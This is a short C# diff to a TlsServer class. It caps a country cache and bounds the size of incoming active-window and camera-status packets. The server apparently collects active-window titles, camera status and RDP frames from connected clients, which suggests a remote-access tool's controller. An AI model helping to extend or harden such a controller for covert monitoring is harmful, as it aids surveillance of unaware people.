@@ -137,6 +137,10 @@ public class TlsServer
         foreach (var ip in _authFail.Keys)
             if (_authFail.TryGetValue(ip, out var v) && now > v.unbanAt)
                 _authFail.TryRemove(ip, out _);
+        // Country cache has no natural expiry — cap at 50k entries to prevent unbounded growth
+        // over the server's lifetime when many unique bot IPs connect and disconnect.
+        if (_countryCache.Count > 50_000)
+            _countryCache.Clear();
     }
 
     public void Stop()
@@ -485,10 +489,12 @@ public class TlsServer
                         break;
 
                     case PacketType.ActiveWindow:
-                        client.ActiveWindow = packet.Data;
+                        if (packet.Data.Length <= 512)
+                            client.ActiveWindow = packet.Data;
                         break;
                     case PacketType.CameraStatus:
-                        client.CameraStatus = packet.Data;
+                        if (packet.Data.Length <= 16)
+                            client.CameraStatus = packet.Data;
                         break;
 
                     case PacketType.RdpFrame:
